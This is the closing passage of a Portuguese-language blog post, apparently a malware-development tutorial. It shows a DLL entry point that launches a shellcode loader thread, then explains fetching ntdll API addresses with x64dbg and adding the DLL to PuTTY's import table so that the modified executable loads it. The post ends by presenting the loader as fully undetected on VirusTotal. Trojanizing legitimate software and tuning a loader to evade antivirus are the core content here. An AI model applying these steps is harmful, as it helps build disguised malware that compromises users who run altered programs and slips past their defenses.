<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">bool</span> __stdcall <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE H_instance, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsn)</span> </span>{

    <span class="hljs-built_in">DisableThreadLibraryCalls</span>(H_instance);
    <span class="hljs-keyword">switch</span> (rsn)
    {
    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
    {
        <span class="hljs-built_in">CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)main, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    } <span class="hljs-keyword">break</span>;

    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
}
</pre>
                        <br>
                        <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
                            Adicionando metadados</h3>
                        <p>Eu decidi adicionar metadados:</p>
                        <br>
                        <p><img src="https://telegra.ph/file/affb9f4604bb55cea8889.png" alt="metadados"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <br>
                        <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
                            Endereços das APIs</h3>
                        <p>Para pegar os endereços das APIs apenas utilizei o <span
                                style="color: #9E2525;">x64dbg</span> e anexei o <span
                                style="color: #9E2525;">notepad.exe</span> no <span
                                style="color: #9E2525;">x64dbg</span> fui em <span
                                style="color: #9E2525;">Simbolos</span> filtrei pela <span
                                style="color: #9E2525;">ntdll</span> e pesquisei pelas APIs que utilizei no código como
                            <span style="color: #9E2525;">NtOpenProcess</span> e copiei o endereço, abaixo uma imagem
                            para melhor entendimento:
                        </p>
                        <br>
                        <p><img src="https://telegra.ph/file/7e334a8d6da0ea83d03df.png" alt="endereço"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <br>
                        <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
                            Infectando nosso executável</h3>
                        <p>Como declaramos uma exportação no nosso código, agora temos apenas que fazer um executável
                            carregar nossa DLL. Para isso, vou utilizar o <span
                                style="color: #9E2525;">CFF-EXPLORER</span>. Neste exemplo, vou usar o <span
                                style="color: #9E2525;">putty</span>. Então, apenas arrastamos o executável do <span
                                style="color: #9E2525;">putty</span> para o <span
                                style="color: #9E2525;">CFF-EXPLORER</span>, vamos para <span
                                style="color: #9E2525;">Import Adder</span>, depois adicionamos nossa DLL, clicamos em
                            <span style="color: #9E2525;">Import By Ordinal</span>, clicamos em <span
                                style="color: #9E2525;">Create New Section</span> e, por fim, clicamos em <span
                                style="color: #9E2525;">Rebuild Import Table</span>. Finalmente, salvamos nosso <span
                                style="color: #9E2525;">putty</span> modificado.
                        </p>
                        <br>
                        <p><img src="https://telegra.ph/file/1a2ec2ab015b772137108.png" alt="Infectando"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <br>
                        <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
                            Testando nosso loader</h3>
                        <p>Então, depois de colocar todos os endereços, podemos testar. Para isso, podemos tanto definir
                            BreakPoints no <span style="color: #9E2525;">x64dbg</span> quanto verificar a pilha de
                            threads pelo <span style="color: #9E2525;">ProcessHacker</span>. Abaixo faço essas
                            verificações:</p>
                        <br>
                        <p><img src="https://telegra.ph/file/2db0880174b68a8d81a5d.gif" alt="verificação"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <br>
                        <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
                            Loader Simples</h3>
                        <p>Um loader que não faz uso de APIs NT agiria dessa forma:</p>
                        <br>
                        <p><img src="https://telegra.ph/file/bbeeb6aaebc666ddb0d68.gif" alt="Simples"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <br>
                        <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
                            Testando nosso loader</h3>
                        <p>Bom, terminamos todas as etapas do nosso loader. Agora, basta testar para ver se ele executa
                            de fato nossa shellcode. Estou usando a mesma shellcode que criei no post anterior.</p>
                        <br>
                        <p><img src="https://telegra.ph/file/6d5a3b3126d45d5d58722.gif" alt="Simples"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <br>
                        <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">FUD?
                        </h3>
                        <p>Bom como podemos ver nosso loader funcionou perfeitamente agora basta jogar no <span
                                style="color: #9E2525;">VirusTotal</span> e ver quanto vai ser detectado:</p>
                        <br>
                        <p><img src="https://telegra.ph/file/7412e35fa2075ab25352c.gif" alt="Simples"
                                style="max-width: 100%; height: 400px; width: 720px; display: block; margin: 20px auto;">
                        </p>
                        <br>
                        <p>Pronto, nosso loader está 100% indetectável no <span
                                style="color: #9E2525;">VirusTotal</span>. No entanto, é importante lembrar que, embora
                            esteja indetectável no <span style="color: #9E2525;">VirusTotal</span>, isso não significa
                            que o &quot;malware&quot; não será detectado por um antivírus (AV) ou sistema de detecção e
                            resposta de endpoint (EDR), pois são coisas diferentes. Então é isso, tchau tchau!</p>
                    </div>
                </article>
            </div>
        </main>
        <footer style="background-color: rgba(27, 27, 27, 0.7); text-align: center; padding: 5px 0;">
            <h6 style="color: rgba(255, 255, 255, 0.4) !important;">Copyright © Vithor 2023/2024</h6>
        </footer>
        <script>
            function isMobileDevice() {
                return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
            }

            if (isMobileDevice()) {
                alert("Este site não é compatível com dispositivos móveis. Você será redirecionado para o Google.");
                window.location.href = "https://www.google.com";
            }
        </script>
    </body>

</html>